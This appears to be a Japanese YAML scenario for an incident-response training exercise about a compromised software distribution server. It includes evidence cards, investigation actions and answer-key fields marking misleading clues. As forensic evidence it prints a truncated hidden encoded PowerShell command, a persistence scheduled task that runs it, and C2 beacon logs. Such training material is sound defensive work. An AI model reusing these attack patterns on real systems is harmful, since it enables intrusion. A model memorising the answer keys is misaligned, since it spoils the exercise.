+        powershell -nop -w hidden -enc SQBOAFYATwBLAEUALQBFAFgAUABSAEUAUwBTAEkA...
+
+      照会対象 : ジョブ定義の現在値と保存履歴
+      非対象   : パッケージ本体、その署名
+
+  # **指しているのは受け取った端末だけである。** 配信実績台帳は平常時にも
+  # 同じ形で出る運用記録で、「配った」ことを咎める資料ではない。
+  # 配り元そのものを指す非誤導の証拠は、コンソールの記録と稼働中の状態の
+  # 2つしか無い — どちらも誤導を畳む材料を兼ねている（SPEC 8.3）
+  - id: ev_deploy_ledger
+    points_to: [ws-eng01]
+    misleading: false
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 11:05"
+    summary: "ring-1 への配信は 11:05 に完了し、後続の窓が 13:50 と 16:20 に控えている"
+    reading: |
+      配信実績台帳である。段階配信では、対象をいくつかの区分（ring）に
+      分け、前の区分の結果を見てから次の区分へ進む。
+
+      status の読み方:
+        completed  配信が終わり、対象の端末で導入まで終わっている
+        scheduled  窓の時刻が決まっていて、まだ来ていない
+        held       止められていて、窓が来ても走らない
+
+      scheduled の行は予定であって実績ではない。その時刻が来たときに
+      配信元が動いていれば走り、止まっていれば走らない。
+
+      Targets は、その区分に属する端末の台数である。
+      どの端末が属するかは、共通設定の区分の割当に書かれている。
+    possibilities:
+      - |-
+        予定どおりに進んでいて、次の窓も予定どおり開く。
+        その時刻に配る側がどうなっているかで分かれる
+      - |-
+        既に走った分の中身が、予定していたものと違っている。
+        入った先に何が残っているかで分かれる
+      - |-
+        台帳の側が、実際に走った分を写しきれていない。
+        端末の側の導入記録と突き合わせて分かれる
+    content: |
+      # dist01 / jobctl deployments --job pdfview-4.2.2
+
+      ring-1  検証   Targets=1  status=completed  2026-04-09 11:05:14
+      ring-2  営業   Targets=1  status=scheduled  2026-04-09 13:50:00
+      ring-3  経理   Targets=1  status=scheduled  2026-04-09 16:20:00
+      ring-4  共用   Targets=1  status=held       (割当なし)
+
+      # jobctl deployments --job pdfview-4.2.2 --ring 1 --detail
+        WS-ENG01   installed  4.2.2   2026-04-09 11:05:14   rc=0
+
+      照会対象 : この配信ジョブの区分ごとの実績と予定
+      非対象   : 他の配信ジョブ、区分に属さない端末
+
+  - id: ev_repo_audit
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "repo01 のパッケージ領域には、当日の書き込みが 1 件も記録されていない"
+    reading: |
+      保管庫のファイル監査ログの集計である。
+
+      write は新規作成と上書きの両方を含む。read は参照、delete は削除で、
+      それぞれ別に数えられている。配信元がパッケージを取りに来る動きは
+      read として記録される。
+
+      集計の対象は、監査が有効になっている領域に限られる。
+      どこが対象かは、監査設定の側に書かれている。
+
+      書き込みが 0 であることが分かるのは、この領域について言えることで
+      ある。同じ内容の控えが別の場所にも置かれていれば、そちらは
+      この集計には入らない。
+    possibilities:
+      - |-
+        この領域の中身は、当日は誰も書き換えていない。
+        領域の外に何が置かれているかで分かれる
+      - |-
+        書き換えはあったが、監査の対象外の経路で行われた。
+        監査設定が覆っている範囲で分かれる
+      - |-
+        中身は変わっておらず、触られたのは別の場所である。
+        その別の場所の変更記録があるかで分かれる
+    content: |
+      # fsauditctl summary --host REPO01 --path /srv/packages --from 2026-04-09T00:00
+
+      read    : 1,284
+      write   : 0
+      delete  : 0
+      rename  : 0
+
+      内訳 (read の上位)
+        192.0.2.10 (DIST01)  1,281
+        192.0.2.31 (MGMT01)      3
+
+      集計対象 : /srv/packages 配下（監査有効）
+      非対象   : 監査が有効でない領域、保管庫の外に置かれた控え
+
+  - id: ev_dist_live
+    points_to: [dist01]
+    misleading: false
+    plausibility: high
+    volatile: true
+    occurred_at: "2026-04-09 11:07"
+    summary: "dist01 の稼働中のセッションに、外部アドレスからの接続が残っている"
+    reading: |
+      稼働中のサーバから採取した、プロセス一覧と接続一覧である。
+
+      ESTABLISHED は、その接続が採取の瞬間に生きていたことを示す。
+      接続の相手が拠点の外のアドレスなら、外との通信がその時点で
+      続いていたことになる。
+
+      プロセスの開始時刻は、そのプロセスがいつ起動したかを指す。
+      サービスとして常駐しているものは、サーバの起動時刻に揃う。
+      そこから外れているものは、後から起動したものである。
+
+      この一覧は採取した瞬間の姿であり、電源を落とすか、
+      サービスを止め直した時点で以後は取れなくなる。
+    possibilities:
+      - |-
+        保守の作業のために開いた口が、そのまま開いている。
+        その時間帯の作業予定と突き合わせて分かれる
+      - |-
+        外から入られた口が、いまも保たれている。
+        その口を開いた側の記録の有無で分かれる
+      - |-
+        監視や連携のための常時接続が、そう見えている。
+        接続先と使っている口の番号で分かれる
+    content: |
+      # 採取 11:5x（サーバは稼働のまま）
+      # ss -tnp state established
+
+      192.0.2.10:8443   192.0.2.44:52118    users:(("cfgsvc",pid=2214))
+      192.0.2.10:44102  203.0.113.24:443    users:(("mgmtd",pid=3907))
+
+      # ps -o pid,lstart,cmd -p 3907
+        3907  Thu Apr  9 11:07:31 2026  /usr/sbin/mgmtd --console
+
+      取得範囲 : 採取時点で生きているプロセスと接続
+      非対象   : 採取より前に終了した接続、電源断後に残らない状態
+
+  - id: ev_eng_memory
+    points_to: [ws-eng01]
+    misleading: false
+    plausibility: high
+    volatile: true
+    occurred_at: "2026-04-09 11:13"
+    summary: "ws-eng01 のメモリに、常駐タスクの登録と外部への接続が残っている"
+    reading: |
+      メモリイメージの解析結果である。
+
+      pslist は、イメージを取った瞬間に動いていたプロセスの一覧で、
+      netscan は同じ瞬間の接続の一覧である。
+
+      printkey はレジストリの特定の鍵の中身を並べる。
+      Run 配下と、登録された定期実行は、どちらも端末の起動時や
+      決まった時刻に何かを動かすための登録先である。
+      ここに登録が入っていると、端末を再起動しても同じものが動き出す。
+
+      登録の作成時刻は、その登録がいつ入ったかを指す。
+      メモリの中にしか無い文字列は、電源を落とした時点で失われる。
+    possibilities:
+      - |-
+        端末を起動し直しても、同じものが動き出す状態にある。
+        登録の作成時刻と、入った時刻で分かれる
+      - |-
+        一度きりの実行で、登録としては残っていない。
+        起動のたびに動く登録があるかどうかで分かれる
+      - |-
+        元から入っていた仕組みが、そう見えているだけである。
+        配った標準構成の控えと比べて分かれる
+    content: |
+      # vol.py -f wseng01.raw windows.pslist
+        94 processes
+        3312  powershell.exe   ppid=2908  start 2026-04-09 11:12:44
+        2908  cmd.exe          ppid=1704  start 2026-04-09 11:12:41
+
+      # vol.py -f wseng01.raw windows.netscan
+        3312  192.0.2.44:52960 -> 203.0.113.24:443  ESTABLISHED
+
+      # vol.py -f wseng01.raw windows.registry.printkey --key "...\CurrentVersion\Run"
+        (既定)  値なし
+
+      # vol.py -f wseng01.raw windows.registry.printkey --key "...\TaskCache\Tree"
+        CfgAgentUpdateCheck   作成 2026-04-09 11:13:07
+
+      取得範囲 : イメージを取った瞬間の稼働状態
+      非対象   : 取得より前に終了したプロセス、ディスク上の更新時刻
+
+  - id: ev_eng_disk
+    points_to: [ws-eng01]
+    misleading: false
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 11:13"
+    summary: "ws-eng01 のディスクに、導入後処理の作業記録と登録された定期実行が残る"
+    reading: |
+      停止した端末から取ったディスクイメージの解析結果である。
+
+      $MFT はファイルの作成・更新の時刻を保持する索引で、
+      いつ何が置かれたかを網羅的に並べられる。
+
+      ShimCache は過去に実行された実行体の並びで、
+      実行の順序と、その時点のファイルの大きさが残る。
+
+      タスクの定義ファイルは XML として置かれる。Triggers は
+      いつ動くか、Actions は何を動かすかを指す。
+      ディスクに残るのは登録の形であって、いま動いているかどうかは
+      稼働中の状態の側にある。
+    possibilities:
+      - |-
+        置かれたものが、決まった時刻に動く形になっている。
+        いつ置かれたかと、何を動かすかで分かれる
+      - |-
+        置かれてはいるが、まだ一度も動いていない。
+        実行の記録の側に並びがあるかで分かれる
+      - |-
+        配った標準構成に元から含まれていたものである。
+        配布の控えと突き合わせて分かれる
+    content: |
+      # mftecmd.exe -f wseng01.E01 --csv /mnt/ir/out
+        392,441 records
+
+      作成時刻順 (2026-04-09 11:05 以降)
+        11:05:14  C:\ProgramData\CfgAgent\pkg\pdfview-4.2.2\
+        11:05:19  C:\ProgramData\CfgAgent\pkg\pdfview-4.2.2\post-install.cmd
+        11:13:07  C:\Windows\System32\Tasks\CfgAgentUpdateCheck
+
+      # type C:\Windows\System32\Tasks\CfgAgentUpdateCheck
+        <Triggers><LogonTrigger/><TimeTrigger Repetition="PT30M"/></Triggers>
+        <Actions><Exec><Command>powershell.exe</Command>
+          <Arguments>-nop -w hidden -enc SQBOAFYA...</Arguments></Exec></Actions>
+
+      取得範囲 : ディスク上のファイル索引と実行の並び
+      非対象   : 停止時に失われた稼働中の状態
+
+  - id: ev_proxy
+    points_to: [ws-eng01]
+    misleading: false
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 11:16"
+    summary: "ws-eng01 の外向き通信は、一定間隔の短い往復で C2 の常時接続に一致する"
+    reading: |
+      プロキシと境界ファイアウォールの記録である。
+
+      1行は1リクエストで、時刻・送信元・宛先・転送量・User-Agent が並ぶ。
+      間隔の平均と標準偏差は、リクエストの時刻の差から計算できる。
+
+      間隔がほぼ一定で、転送量が小さく、User-Agent が一般的な
+      ブラウザと違う形のものは、人の操作ではなく機械が定期的に
+      話しかけている形である。
+
+      転送量が小さいことは、大きなものを外へ出していないことを表す。
+      何を話しているかは、この記録からは分からない。
+    possibilities:
+      - |-
+        決まった間隔で外へ問い合わせる仕組みが動いている。
+        配った構成に載っているかで分かれる
+      - |-
+        外の相手から指示を受け取る通信が続いている。
+        話している相手と使っている口で分かれる
+      - |-
+        利用者が開いた画面が、裏で更新を繰り返している。
+        本人の操作とその時刻で分かれる
+    content: |
+      # zgrep '192.0.2.44' /var/log/squid/access.log
+
+      11:16:02  192.0.2.44  CONNECT 203.0.113.24:443  bytes=1,102  UA=-
+      11:17:03  192.0.2.44  CONNECT 203.0.113.24:443  bytes=986    UA=-
+      11:18:01  192.0.2.44  CONNECT 203.0.113.24:443  bytes=1,044  UA=-
+      ...
+
+      間隔 : 平均 60.4 秒 / 標準偏差 1.2 秒
+      合計 : 8 リクエスト / 8,310 bytes
+
+      収集範囲 : プロキシを経由した外向きの通信
+      非対象   : プロキシを経由しない直接の外向き通信
+
+  - id: ev_dlp
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "当日の DLP と CASB に、機密区分の外部送信の検知は 0 件である"
+    reading: |
+      情報持ち出し監視と、クラウド利用監視の記録である。
+
+      DLP の検知は、送ろうとした中身が登録された区分の条件に当たったときに
+      上がる。条件に当たらない中身や、暗号化されて中身が読めない通信は、
+      条件との照合そのものが行われない。
+
+      CASB が見るのは、承認済みと未承認のクラウド宛先への転送量である。
+      承認済み宛先への送信は通常の業務でも発生するので、
+      検知ではなく転送として数えられる。
+
+      転送量の下限を設定すると、それを下回る送信は集計に入らない。
+    possibilities:
+      - |-
+        条件に当たる中身は、当日は外へ出ていない。
+        条件の外にある中身がどう扱われるかで分かれる
+      - |-
+        出てはいるが、条件に当たらない形にされていた。
+        通信の中身が読める状態だったかで分かれる
+      - |-
+        外へ出る経路そのものが、監視の外にあった。
+        経路ごとの覆っている範囲で分かれる
+    content: |
+      # dlpctl alerts --from 2026-04-09T00:00 --policy confidential-egress
+        0 alerts
+
+      # casbctl egress --unapproved --min-size 5MB --from 2026-04-09T00:00
+        0 transfers
+
+      # casbctl egress --approved --min-size 5MB --from 2026-04-09T00:00
+        3 transfers (いずれも承認済み宛先)
+
+      照会対象 : 5MB 以上の外部送信、機密区分の条件に当たる送信
+      非対象   : 5MB 未満の送信、中身が読めない通信
+
+  - id: ev_sweep_state
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "各端末の配布エージェントは同じ版で、区分の割当も設定どおりである"
+    reading: |
+      各端末を回って、配布エージェントの現況を突き合わせた結果である。
+
+      AgentVersion はエージェント自身の版で、配るパッケージの版とは別の
+      ものである。LastPoll は最後に配信元へ問い合わせた時刻、
+      Assignment はその端末に割り当てられている区分を指す。
+
+      問い合わせの結果が no-assignment なら、その時点でその端末宛の
+      配信は用意されていなかったことになる。用意されるのは、
+      その区分の窓が開いたときである。
+
+      ここに並ぶのは、回った時点での姿である。窓が開いた後に
+      もう一度回れば、同じ欄が別の値を持つことがある。
+    possibilities:
+      - |-
+        どの端末も同じ仕組みが同じ設定で動いている。
+        次に窓が開いたときに何が来るかで分かれる
+      - |-
+        設定は同じでも、受け取る中身は区分ごとに違う。
+        どの区分にいつ何が配られるかで分かれる
+      - |-
+        いま回って見えた姿は、時間が経てば変わりうる。
+        回った時刻と窓の時刻の前後で分かれる
+    content: |
+      # cfgagentctl inventory --all
+
+      HOST       AgentVersion  Assignment  LastPoll             Result
+      WS-ENG01   2.9.4         ring-1      2026-04-09 11:00:01  assigned
+      WS-SALES   2.9.4         ring-2      2026-04-09 11:00:04  no-assignment
+      WS-ACCT    2.9.4         ring-3      2026-04-09 11:00:03  no-assignment
+      WS-LOBBY   2.9.4         ring-4      2026-04-09 11:00:02  no-assignment
+      MGMT01     2.9.4         (管理対象外) —                   —
+
+      照会対象 : 各端末で動いている配布エージェントの現況
+      非対象   : 回った時点より後に起きること
+
+  # ── 配られて初めて実在する資料（SPEC 5.2 の `reveals`） ──
+  # 窓が開く前に引いても、そこには何も無い。配り元を止めてあれば、
+  # この2枚は最後まで盤面に現れない。**起きていないことは配らない**
+  - id: ev_ring_sales
+    points_to: [ws-sales]
+    misleading: false
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 13:50"
+    summary: "ws-sales に新しい版が入り、導入後処理が走った記録が残っている"
+    reading: |
+      端末を回って採取した、導入の作業記録である。
+
+      post-install.log は導入のたびに追記され、begin と end が対になる。
+      その間の step 行が、導入の途中で何を行ったかを表す。
+
+      rc は終了コードで、0 は処理が最後まで走ったことを示す。
+      走ったこと自体は、その処理の中身の良し悪しとは別の話である。
+
+      InstalledAt と作業記録の時刻が揃っていれば、その版が入ったときに
+      その処理が走ったことになる。
+    possibilities:
+      - |-
+        予定された配信が、予定の時刻に届いて動いた。
+        届いた中身に何が含まれていたかで分かれる
+      - |-
+        利用者が自分で新しい版を入れ、処理が走った。
+        入れた経路と本人の申告で分かれる
+      - |-
+        記録だけが書かれ、処理は途中で止まっている。
+        端末の側に何が置かれたかで分かれる
+    content: |
+      # cfgagentctl status --host WS-SALES
+
+      InstalledVersion : pdfview 4.2.2
+      InstalledAt      : 2026-04-09 13:50:11
+      Ring             : ring-2
+
+      # tail -4 C:\ProgramData\CfgAgent\post-install.log
+        2026-04-09 13:50:11  begin  pdfview 4.2.2
+        2026-04-09 13:50:12  step   run post-install.cmd
+        2026-04-09 13:50:14  step   spawn powershell.exe
+        2026-04-09 13:50:16  end    rc=0
+
+      取得範囲 : この端末上の導入記録と、いま入っている版
+      非対象   : 導入より前に端末上で起きたこと
+
+  - id: ev_ring_acct
+    points_to: [ws-acct]
+    misleading: false
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 16:20"
+    summary: "ws-acct に新しい版が入り、導入後処理が走った記録が残っている"
+    reading: |
+      端末を回って採取した、導入の作業記録である。読み方は同じ形の
+      資料と変わらない。
+
+      Ring はその端末が属する区分で、区分ごとに窓の時刻が違う。
+      InstalledAt はその端末に版が入った時刻を指す。
+
+      同じ配信元から同じ版が配られていれば、区分が違っても
+      作業記録の並びは同じ形になる。違うのは時刻だけである。
+
+      作業記録は端末の側に残るので、配信元の台帳が何を書いていても、
+      端末に入ったかどうかはここで確かめられる。
+    possibilities:
+      - |-
+        予定された配信が、予定の時刻に届いて動いた。
+        届いた中身に何が含まれていたかで分かれる
+      - |-
+        利用者が自分で新しい版を入れ、処理が走った。
+        入れた経路と本人の申告で分かれる
+      - |-
+        記録だけが書かれ、処理は途中で止まっている。
+        端末の側に何が置かれたかで分かれる
+    content: |
+      # cfgagentctl status --host WS-ACCT
+
+      InstalledVersion : pdfview 4.2.2
+      InstalledAt      : 2026-04-09 16:20:09
+      Ring             : ring-3
+
+      # tail -4 C:\ProgramData\CfgAgent\post-install.log
+        2026-04-09 16:20:09  begin  pdfview 4.2.2
+        2026-04-09 16:20:10  step   run post-install.cmd
+        2026-04-09 16:20:12  step   spawn powershell.exe
+        2026-04-09 16:20:14  end    rc=0
+
+      取得範囲 : この端末上の導入記録と、いま入っている版
+      非対象   : 導入より前に端末上で起きたこと
+
+open_questions:
+  - id: q_initial_access
+    label: "初期侵入経路"
+    question: "攻撃者はどこから入ったか"
+    resolved_by: [ev_console_login]
+    resolution_mode: any
+    critical: true
+    implication: |
+      入られた口を塞がないまま封じ込めても、同じ口から戻られます。
+      保守用の口が外向きに開いたままなら、止めた側から順に
+      元へ戻されることになります。
+
+  - id: q_payload_reach
+    label: "配られたものの届いた範囲"
+    question: "入ってきたものは、どこまで配られているか"
+    # **台帳と端末の両方が要る。** 台帳が言うのは「配った」ことまでで、
+    # 届いて動いたかどうかは端末の側にしか残らない。片方で閉じると、
+    # 最短経路から入口の手が落ちて、押せない下限が講評に出る
+    resolved_by: [ev_eng_child, ev_deploy_ledger]
+    resolution_mode: all
+    critical: true
+    implication: |
+      どこまで届いているかを押さえないまま止めても、
+      既に受け取った側はそのまま残ります。さらに、これから開く窓が
+      あるかどうかも分からないまま手を打つことになります。
+
+  - id: q_persistence
+    label: "永続化の有無"
+    question: "再起動しても戻ってくる状態か"
+    resolved_by: [ev_eng_memory]
+    resolution_mode: any
+    critical: true
+    implication: |
+      残されたものを確認しないまま隔離を解くと、端末は再び外へ
+      つなぎに行きます。稼働中の状態にしか残らない情報であり、
+      端末を停止した時点で確認する手段は失われます。
+
+  - id: q_exfiltration
+    label: "データ持ち出しの有無"
+    question: "外部通信は持ち出しか C2 か"
+    resolved_by: [ev_proxy, ev_dlp]
+    resolution_mode: all
+    critical: false
+    implication: |
+      持ち出しの有無は、委託先契約上の通知義務と、
+      顧客への報告の要否の判断に直結します。
+
+actions:
+  # ── 調査（最初から選べる 6手） ──
+  - id: act_eng_edr_detail
+    label: "ws-eng01 の EDR 検知の詳細を確認"
+    command: |
+      $ edrctl alert show --id alert-2026-0409-0037 --tree
+        1 alert, process tree depth 3
+
+      $ edrctl alert show --id alert-2026-0409-0037 --decode-b64
+        1 command line decoded
+    group: "ws-eng01（設計部端末）"
+    phase: investigation
+    type: investigate
+    description: |
+      監視センターが上げてきた検知そのものを開き、何が何から起動したかの
+      親子関係と、実行時のコマンド行を読める形にする。
+    cost_minutes: 15
+    investigates: [ws-eng01]
+    yields: [ev_eng_child]
+
+  - id: act_netflow_overview
+    label: "ネットワークフローの概況確認"
+    command: |
+      $ nfdump -R /var/netflow/2026-04-09 -t 2026/04/09.10:00-11:20 -s record/bytes -n 30
+        Aggregated flows : 22,914
+        Top 30 by bytes  : listed
+
+      $ nfdump -R /var/netflow/2026-04-09 -t 2026/04/09.10:00-11:20 -s srcip/flows
+        7 hosts
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    description: |
+      コアスイッチと境界のフロー情報から、午前中の通信を通信量順と
+      発信元別に並べる。中身は見えないが、どの端末がどこへ話したかが分かる。
+    cost_minutes: 20
+    investigates: [ws-eng01, ws-lobby, mgmt01]
+    yields: [ev_agent_beacon]
+
+  - id: act_agent_config
+    label: "配布エージェントの共通設定と運用手順書を確認"
+    command: |
+      $ cat /etc/cfgagent/cfgagent.policy
+        24 lines
+
+      $ docctl get --doc 構成管理運用手順書 --rev latest
+        rev 7 (2026-02-18)
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    description: |
+      拠点の端末に配られている共通設定と、その運用手順書を引く。
+      問い合わせの間隔、宛先、段階配信の区分の決め方を確認する。
+      異常かどうかを判定するには、平常時の姿を知る必要がある。
+    cost_minutes: 15
+    investigates: []
+    yields: [ev_agent_policy]
+
+  - id: act_change_ledger
+    label: "変更管理台帳・資産管理台帳の照会"
+    command: |
+      $ curl -s "https://cmdb.corp.local/api/changes?date=2026-04-09" | jq length
+        1 record
+
+      $ curl -s "https://cmdb.corp.local/api/assets?site=HQ" | jq '.[] | {id,owner,role}'
+        7 records
+    group: "台帳・運用の記録"
+    phase: investigation
+    type: investigate
+    description: |
+      その日に承認されている作業と、各資産の用途・管理者を台帳から引く。
+      申請されていた作業があるかどうかを先に押さえる。
+    cost_minutes: 10
+    investigates: []
+    yields: [ev_change_ticket]
+
+  - id: act_edr_full_scan
+    label: "全端末に EDR のフルスキャンを実行"
+    command: |
+      $ edrctl scan --all --type full --wait
+        DIST01     ........ done   0 detections
+        REPO01     ........ done   0 detections
+        MGMT01     ........ done   0 detections
+        WS-ENG01   ........ done   0 detections
+        WS-ACCT    ........ done   0 detections
+        WS-SALES   ........ done   0 detections
+        WS-LOBBY   ........ done   0 detections
+
+        Scanned      : 7 hosts / 7,632,519 files / 34m11s
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    description: |
+      全端末に EDR のフルスキャンを走らせ、既知のシグネチャと照合する。
+      ディスク上の検体を探す作業。
+    cost_minutes: 35
+    investigates: []
+    yields: [ev_edr_scan]
+
+  - id: act_backup_check
+    label: "バックアップの世代と復元試験"
+    command: |
+      $ bkpctl status --set corp-daily
+        14 generations
+
+      $ bkpctl restore --set corp-daily --generation 2026-04-09T02:00 \
+          --to /mnt/verify --limit 50
+        50 items restored ... OK
+    group: "台帳・運用の記録"
+    phase: investigation
+    type: investigate
+    description: |
+      バックアップの世代と保持状況を確認し、実際に書き戻して
+      中身が読めるかを試す。復旧可否を早めに把握したい。
+    cost_minutes: 30
+    investigates: []
+    yields: [ev_backup_state]
+
+  # ── 調査（手がかりが出てから開く分） ──
+  # 入口は2本ある。本物（ev_eng_child）からも、誤導（ev_agent_beacon）からも
+  # 開く。本物だけが扉を開けるなら「増えた選択肢＝正しい道」になり、
+  # システムが正解を教えていることになる（SPEC 5.6）
+  - id: act_priv_audit
+    label: "管理者権限の操作履歴を横断して確認"
+    command: |
+      $ auditctl query --elevated --from 2026-04-09T10:00 --to 2026-04-09T11:20
+        68 events
+
+      $ auditctl query --elevated --group-by source
+        2 sources
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_eng_child, ev_agent_beacon]
+    description: |
+      権限を昇格させた操作を、拠点の管理系サーバから横断で抜き出し、
+      どの端末から誰が何をしたかを並べる。
+    cost_minutes: 25
+    investigates: [mgmt01]
+    yields: [ev_mgmt_privileged]
+
+  - id: act_mgmt_triage
+    label: "mgmt01 をトリアージ"
+    command: |
+      $ irtriage.exe --host MGMT01 --collect autoruns,shimcache,tasks
+        autoruns  : 27 entries
+        shimcache : 418 entries
+        tasks     : 66 entries
+        (00:21:07)
+
+      $ irtriage.exe --host MGMT01 --compare-baseline corp-win11-std
+        3 sections compared
+    group: "mgmt01（運用作業端末）"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_mgmt_privileged]
+    description: |
+      mgmt01 の自動起動、実行履歴、登録された定期実行を一括で収集し、
+      配っている標準構成と突き合わせる。
+    cost_minutes: 25
+    investigates: [mgmt01]
+    yields: [ev_mgmt_local]
+
+  - id: act_lobby_live
+    label: "ws-lobby に臨場して、稼働させたまま確認"
+    command: |
+      $ 09:4x 現地着。端末は電源が入ったまま
+      $ cfgagentctl status --local
+        4 fields
+
+      $ tail -3 C:\ProgramData\CfgAgent\post-install.log
+        3 lines
+
+      $ Get-Process | Measure-Object
+        Count : 88
+    group: "ws-lobby（受付の共用端末）"
+    phase: investigation
+    type: investigate
+    # 臨場して動かしたまま採る手なので、稼働中の状態の採取にあたる。
+    # タグを付けないと、証拠保全最優先で**この端末は止めれば必ず違反**に
+    # なる — 採取の手が盤面にあるのに要件を満たせない、という嘘になる
+    tags: [volatile_capture]
+    requires_evidence: [ev_eng_child, ev_agent_beacon]
+    description: |
+      ws-lobby のところまで行き、端末を動かしたまま、入っている版と
+      導入の作業記録、稼働中のプロセスと接続を採取する。
+      移動と現地での作業の分だけ時間がかかる。
+    cost_minutes: 30
+    investigates: [ws-lobby]
+    yields: [ev_lobby_live]
+
+  # **安いほうを先に置いてある。** この手が返すのは正しい資料で、
+  # 誤るのは読み手の一般化のほうである（SPEC 3.4）。
+  # 15分で「白」と読んで先へ進むか、30分の変更履歴まで引くかが、
+  # この盤面でいちばん高くつく分かれ目になる
+  - id: act_pkg_verify
+    label: "dist01 と repo01 のパッケージ署名を検証"
+    command: |
+      $ pkgctl verify --all --source repo01 --cache dist01
+        48 packages verified   (00:12:44)
+
+      $ pkgctl verify --all --print-thumbprint
+        1 distinct thumbprint
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_eng_child, ev_agent_beacon]
+    description: |
+      保管庫と配信元が持っているパッケージを全件、署名と突き合わせる。
+      署名した時点から中身が変わっていないかを見る作業。
+    cost_minutes: 15
+    investigates: [dist01, repo01]
+    yields: [ev_pkg_signature]
+
+  # **棄却の材料を出す手は、棄却以外の仕事も持っている**（SPEC 8.3）。
+  # ジョブ定義の変更履歴は署名検証の読み違いを壊す唯一の材料だが、
+  # 同じ照会が入られた口も答える。割って置くと「列挙だけで畳むプレイ」が
+  # 材料を買うプレイに勝ち、この手は値札が付いたまま誰も押さなくなる
+  - id: act_dist_console_history
+    label: "dist01 の管理コンソールの操作記録と配信ジョブの変更履歴を照会"
+    command: |
+      $ jobctl audit login --from 2026-04-09T00:00
+        11 sessions
+
+      $ jobctl audit login --from 2026-04-09T00:00 --group-by source
+        3 sources
+
+      $ jobctl show --job pdfview-4.2.2 --history
+        2 revisions
+
+      $ jobctl diff --job pdfview-4.2.2 --rev 8..9
+        1 added line
+
+      $ jobctl export --job pdfview-4.2.2 --include-scripts /mnt/ir/job/
+        3 files exported
+    group: "dist01（構成管理サーバ）"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_eng_child, ev_agent_beacon]
+    description: |
+      構成管理サーバのコンソールに残っている操作の記録を引き、
+      誰がどこから入って何をしたかと、配信ジョブの定義の保存履歴を見る。
+    cost_minutes: 25
+    investigates: [dist01]
+    yields: [ev_console_login, ev_job_definition]
+
+  - id: act_deploy_ledger
+    label: "dist01 の配信実績台帳を照会"
+    command: |
+      $ jobctl deployments --job pdfview-4.2.2
+        4 rings listed
+
+      $ jobctl deployments --job pdfview-4.2.2 --ring 1 --detail
+        1 target
+    group: "dist01（構成管理サーバ）"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_eng_child, ev_agent_beacon]
+    description: |
+      段階配信の区分ごとに、いつ配り終えていて、次はいつ配る予定かを
+      台帳から引く。配る側から見た進み方を確認する。
+    cost_minutes: 15
+    investigates: [dist01]
+    yields: [ev_deploy_ledger]
+
+  - id: act_repo_audit
+    label: "repo01 の書き込み監査ログを照会"
+    command: |
+      $ fsauditctl summary --host REPO01 --path /srv/packages --from 2026-04-09T00:00
+        4 counters
+
+      $ fsauditctl config --host REPO01
+        1 audited path
+    group: "repo01（パッケージ保管庫）"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_eng_child, ev_agent_beacon]
+    description: |
+      保管庫のパッケージ領域について、当日の読み書きの監査記録を集計し、
+      どこから何件の操作があったかを見る。
+    cost_minutes: 20
+    investigates: [repo01]
+    yields: [ev_repo_audit]
+
+  - id: act_dist_live_capture
+    label: "dist01 を動かしたまま稼働中の状態を採取"
+    command: |
+      $ ss -tnp state established > /mnt/ir/dist01-conn.txt
+        31 connections
+
+      $ ps -eo pid,lstart,cmd > /mnt/ir/dist01-ps.txt
+        212 processes
+
+      $ ir-evidence store --case IR-2026-0409 --dir /mnt/ir --hash sha256
+        stored, chain-of-custody entry created
+        サーバは稼働を継続。サービスの再起動は行わない。
+    group: "dist01（構成管理サーバ）"
+    phase: investigation
+    type: investigate
+    tags: [volatile_capture]
+    requires_evidence: [ev_eng_child, ev_agent_beacon]
+    description: |
+      構成管理サーバを動かしたまま、生きているプロセスと接続を採取して
+      保全用の領域に収める。サービスは止めない。
+    cost_minutes: 25
+    investigates: [dist01]
+    yields: [ev_dist_live]
+
+  # 仕掛けと読解を割ってある（SPEC 5.6.2 / 5.6.3）。合計 45分は割る前と同じで、
+  # 変わるのは**どこに置けるか**だけ。取得だけ先に済ませておけば、
+  # 現場が端末を触っても手元のイメージは変わらない（secures）。
+  # 読むのは後でよく、読まずに終えることもできる —
+  # その場合 q_persistence は解けないまま残る
+  - id: act_eng_memory_capture
+    label: "ws-eng01 のメモリイメージを取得して保全"
+    command: |
+      $ winpmem_mini_x64.exe \\WS-ENG01\c$\ir\wseng01.raw
+        Acquiring physical memory ... 16,384 MB / 16,384 MB   (00:10:58)
+        SHA-256 recorded
+
+      $ ir-evidence store --case IR-2026-0409 --file wseng01.raw --hash sha256
+        stored, chain-of-custody entry created
+    group: "ws-eng01（設計部端末）"
+    phase: investigation
+    type: investigate
+    tags: [volatile_capture]
+    requires_evidence: [ev_eng_child]
+    description: |
+      稼働中の ws-eng01 からメモリイメージを取得し、保全用の領域に収める。
+      端末は動かしたまま行う。取得したイメージの解析は別の作業で、
+      そちらにさらに時間がかかる。
+    cost_minutes: 20
+    investigates: [ws-eng01]
+    yields: []
+    secures: [ev_eng_memory]
+
+  - id: act_eng_memory_analyze
+    label: "ws-eng01 のメモリイメージを解析"
+    command: |
+      $ vol.py -f wseng01.raw windows.pslist
+        94 processes
+      $ vol.py -f wseng01.raw windows.netscan
+        38 connections
+      $ vol.py -f wseng01.raw windows.registry.printkey --key "...\CurrentVersion\Run"
+        key dumped
+      $ vol.py -f wseng01.raw windows.registry.printkey --key "...\TaskCache\Tree"
+        key dumped
+    group: "ws-eng01（設計部端末）"
+    phase: investigation
+    type: investigate
+    requires_actions: [act_eng_memory_capture]
+    description: |
+      保全してあるメモリイメージを解析する。実行中プロセス、確立中の接続、
